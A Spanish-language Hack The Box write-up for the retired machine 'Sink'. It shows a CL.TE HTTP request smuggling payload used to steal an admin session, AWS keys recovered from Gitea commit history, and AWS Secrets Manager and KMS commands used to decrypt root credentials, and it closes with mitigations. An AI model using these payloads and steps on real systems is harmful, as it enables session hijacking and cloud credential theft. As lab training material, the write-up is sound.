---
machine: Sink
os: Linux
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, http-smuggling, haproxy, gitea, aws, kms]
---

# Sink — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Cadena de tres capas muy distintas. Un **HTTP request smuggling** CL.TE entre HAProxy y Gunicorn permite robar la sesión del administrador; con ella se llega a **Gitea**, donde el historial de commits guarda claves de **AWS**. Desde ahí, `secretsmanager` + `kms` descifran el secreto que da root. La gracia es que cada paso parece un callejón sin salida si se busca una vulnerabilidad clásica.

## Reconocimiento

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp   ssh
80/tcp   http  (HAProxy -> Gunicorn)
3000/tcp http  Gitea
5000/tcp http  API interna
```

```bash
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,302,401
```

La portada es una app con login y un panel `/admin`. La respuesta incluye `Server: HAProxy` y el backend es Gunicorn: dos servidores que parsean distinto.

## Foothold: smuggling CL.TE

HAProxy usa `Content-Length`, Gunicorn prioriza `Transfer-Encoding`. Se envía una petición con ambos para que el backend interprete dos requests donde el proxy ve una:

```http
POST / HTTP/1.1
Host: <IP>
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: <IP>
Cookie: session=
```

El backend procesa el `GET /admin` como si viniera del cliente, y las cabeceras del siguiente usuario legítimo se pegan a esa petición: con un endpoint que refleje la `Cookie`, se captura la sesión del admin.

```text
GET /profile HTTP/1.1
Cookie: session=<sesión de admin>
```

## Gitea y secretos en el historial

Con la sesión de admin se accede al panel, que enlaza un **Gitea** interno. En `http://<IP>:3000` hay un repo privado con un `.env` en un commit antiguo:

```bash
git clone http://<IP>:3000/admin/infra.git
git log --all --oneline
git show <commit>:config/.env
```

```text
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=<secret>
AWS_DEFAULT_REGION=us-east-1
```

## AWS: Secrets Manager y KMS

```bash
aws configure set aws_access_key_id AKIA...
aws configure set aws_secret_access_key <secret>
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id prod/root
```

El secreto llega cifrado con una CMK:

```bash
aws kms decrypt --ciphertext-blob fileb://secret.bin \
  --encryption-context purpose=prod --output text --query Plaintext | base64 -d
```

Del descifrado salen las credenciales de `root` del host (o la clave SSH).

## Evidencia (redactada)

```text
/home/<user>/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lecciones

- **Smuggling** sigue siendo rentable cuando un proxy y un backend no coinciden en cómo leer `Content-Length` y `Transfer-Encoding`.
- Los secretos en el historial de git sobreviven al borrado del fichero: `git log --all` los encuentra.
- Una clave IAM con `secretsmanager:GetSecretValue` y `kms:Decrypt` es root en la nube aunque no haya shell.
- Mitigación: rechazar peticiones con ambos headers, normalizar en el proxy, escaneo de secretos en CI y permisos mínimos por servicio.
